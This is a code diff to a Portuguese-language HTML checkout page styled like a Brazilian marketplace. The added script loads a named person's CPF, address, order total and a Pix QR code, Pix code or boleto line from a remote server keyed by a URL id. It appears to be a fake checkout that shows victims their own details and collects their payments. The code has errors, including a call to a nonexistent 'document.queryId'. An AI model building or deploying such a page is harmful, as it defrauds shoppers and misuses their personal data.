@@ -203,8 +203,8 @@
             vertical-align: middle;
             margin-left: 10px;
             background-color: white;
-            padding: 3px; /* Reduzido para um espaço mais sutil */
-            border-radius: 25%; /* Ajustado para arredondamento leve */
+            padding: 3px;
+            border-radius: 25%;
         }
         .payment-box {
             background-color: white;
@@ -363,11 +363,11 @@
             </div>
             <div class="summary">
                 <h3>Resumo da compra</h3>
-                <div><span>Produto</span><span>R$ 2.999,00</span></div>
+                <div><span>Produto</span><span id="productTotal">R$ 2.999,00</span></div>
                 <div><span>Frete</span><span>Grátis</span></div>
                 <div><span>Insira código do cupom</span><span></span></div>
                 <hr>
-                <div class="total"><span>Você pagará</span><span>R$ 2.999,00</span></div>
+                <div class="total"><span>Você pagará</span><span id="totalPayable">R$ 2.999,00</span></div>
             </div>
             <button class="btn-confirm" onclick="reviewPayment()">Continuar</button>
         </div>
@@ -405,11 +405,11 @@
             </div>
             <div class="summary">
                 <h3>Resumo da compra</h3>
-                <div><span>Produto</span><span>R$ 2.999,00</span></div>
+                <div><span>Produto</span><span id="productTotalReview">R$ 2.999,00</span></div>
                 <div><span>Frete</span><span>Grátis</span></div>
                 <div><span>Insira código do cupom</span><span></span></div>
                 <hr>
-                <div class="total"><span>Você pagará</span><span>R$ 2.999,00</span></div>
+                <div class="total"><span>Você pagará</span><span id="totalPayableReview">R$ 2.999,00</span></div>
             </div>
             <button class="btn-confirm" onclick="confirmPurchase()">Confirmar a compra</button>
         </div>
@@ -426,11 +426,11 @@
                     <li>Escaneie o seguinte código:</li>
                 </ol>
                 <div class="qr-code">
-                    <img src="assets/qrcode.png" alt="QR Code">
+                    <img id="qrCodeImage" src="assets/qrcode.png" alt="QR Code">
                 </div>
                 <p>Ou pague e será creditado na hora</p>
                 <div class="copy-key">
-                    <input type="text" value="000212600014br.gob.bcb.pix0104aaa5204000053c" readonly>
+                    <input id="pixCodeInput" type="text" value="000212600014br.gob.bcb.pix0104aaa5204000053c" readonly>
                     <button onclick="copyToClipboard()">Copiar código</button>
                 </div>
             </div>
@@ -448,6 +448,91 @@
     </div>
     <div class="splash-screen" id="splashScreen">Processando...</div>
     <script>
+        // Função para obter o ID da URL
+        function getClientIdFromUrl() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+
+        // Função para carregar os dados do cliente
+        async function loadClientData(clientId) {
+            try {
+                const response = await fetch(`https://mlteste.onrender.com/client/${clientId}`);
+                if (!response.ok) throw new Error('Cliente não encontrado');
+                const client = await response.json();
+
+                // Preencher os dados na seção de escolha de pagamento
+                document.getElementById('clientName').textContent = client.name || 'Nome do Cliente';
+                document.getElementById('clientCPF').textContent = client.cpf || 'CPF 000.000.999-11';
+                document.getElementById('clientAddress').textContent = client.address || 'Endereço do Cliente';
+                document.getElementById('deliveryDate').textContent = client.deliveryDate || '01 e 05';
+                document.getElementById('productNameReview').textContent = client.productName || 'Produto Exemplo';
+                document.getElementById('productTotal').textContent = `R$ ${client.total || '2.999,00'}`;
+                document.getElementById('totalPayable').textContent = `R$ ${client.total || '2.999,00'}`;
+                document.getElementById('productTotalReview').textContent = `R$ ${client.total || '2.999,00'}`;
+                document.getElementById('totalPayableReview').textContent = `R$ ${client.total || '2.999,00'}`;
+                document.getElementById('paymentValue').textContent = `R$ ${client.total || '2.999,00'}`;
+
+                // Preencher a foto do produto se existir
+                if (client.productPhoto) {
+                    document.getElementById('productPhotoReview').src = `data:image/png;base64,${client.productPhoto}`;
+                }
+
+                // Configurar a seção de pagamento
+                function updatePaymentSection() {
+                    const paymentHeader = document.getElementById('paymentHeader');
+                    if (client.paymentMethod === 'boleto') {
+                        paymentHeader.textContent = `Pague R$ ${client.total || '2.999'}* via Boleto para garantir sua compra`;
+                    } else if (client.paymentMethod === 'pix') {
+                        paymentHeader.textContent = `Pague R$ ${client.total || '2.999'}* via Pix para garantir sua compra`;
+                    } else if (client.paymentMethod === 'cartao') {
+                        paymentHeader.textContent = `Pague R$ ${client.total || '2.999'}* via Cartão para garantir sua compra`;
+                    }
+                    paymentHeader.innerHTML += ' <img src="assets/shopping_bag.png" alt="Shopping Bag Icon">';
+
+                    // Atualizar QR Code e Pix Code
+                    if (client.qrCode && client.paymentMethod === 'pix') {
+                        document.getElementById('qrCodeImage').src = `data:image/png;base64,${client.qrCode}`;
+                    }
+                    if (client.pixCode && client.paymentMethod === 'pix') {
+                        document.getElementById('pixCodeInput').value = client.pixCode;
+                    } else if (client.boletoLine && client.paymentMethod === 'boleto') {
+                        document.getElementById('pixCodeInput').value = client.boletoLine;
+                    } else {
+                        document.getElementById('pixCodeInput').value = '';
+                    }
+                }
+
+                // Pré-selecionar o método de pagamento
+                const paymentRadio = document.querySelector(`input[name="payment"][value="${client.paymentMethod || 'pix'}"]`);
+                if (paymentRadio) paymentRadio.checked = true;
+
+                // Atualizar ícone de pagamento na revisão
+                const paymentIconReview = document.getElementById('paymentIconReview');
+                if (client.paymentMethod === 'pix') {
+                    paymentIconReview.src = 'assets/pix.png';
+                    paymentMethodText.textContent = 'Pix';
+                } else if (client.paymentMethod === 'boleto') {
+                    paymentIconReview.src = 'assets/boleto.png';
+                    paymentMethodText.textContent = 'Boleto Bancário';
+                } else if (client.paymentMethod === 'cartao') {
+                    paymentIconReview.src = 'assets/cartao.png';
+                    paymentMethodText.textContent = 'Cartão de Crédito';
+                }
+
+                // Adicionar listener para atualizar a seção de pagamento ao mudar o método
+                document.querySelectorAll('input[name="payment"]').forEach(radio => {
+                    radio.addEventListener('change', updatePaymentSection);
+                });
+
+                updatePaymentSection();
+            } catch (error) {
+                console.error('Erro ao carregar dados do cliente:', error);
+                alert('Erro ao carregar os dados do cliente. Verifique o link ou tente novamente.');
+            }
+        }
+
+        // Funções existentes
         function goBack() {
             const sections = ['paymentChoice', 'reviewSection', 'paymentSection'];
             const current = document.querySelector('.section.active');
@@ -511,18 +596,31 @@
         }
 
         function copyToClipboard() {
-            const input = document.querySelector('.copy-key input');
+            const input = document.queryId('pixCodeInput');
             input.select();
             document.execCommand('copy');
             alert('Código copiado! Prossiga com o pagamento.');
         }
 
+        // Carregar dados ao carregar a página
         window.onload = function() {
-            document.getElementById('clientName').textContent = 'Nome do Cliente';
-            document.getElementById('clientCPF').textContent = 'CPF 000.000.999-11';
-            document.getElementById('clientAddress').textContent = 'Endereço do Cliente';
-            document.getElementById('deliveryDate').textContent = '01 e 05';
-            document.getElementById('productNameReview').textContent = 'Produto Exemplo';
+            const clientId = getClientIdFromUrl();
+            if (clientId) {
+                loadClientData(clientId);
+            } else {
+                console.warn('Nenhum ID de cliente fornecido na URL.');
+                // Definir valores padrão como fallback
+                document.getElementById('clientName').textContent = 'Nome do Cliente';
+                document.getElementById('clientCPF').textContent = 'CPF 000.000.999-11';
+                document.getElementById('clientAddress').textContent = 'Endereço do Cliente';
+                document.getElementById('deliveryDate').textContent = '01 e 05';
+                document.getElementById('productNameReview').textContent = 'Produto Exemplo';
+                document.getElementById('productTotal').textContent = 'R$ 2.999,00';
+                document.getElementById('totalPayable').textContent = 'R$ 2.999,00';
+                document.getElementById('productTotalReview').textContent = 'R$ 2.999,00';
+                document.getElementById('totalPayableReview').textContent = 'R$ 2.999,00';
+                document.getElementById('paymentValue').textContent = 'R$ 2.999,00';
+            }
         };
     </script>
 </body>
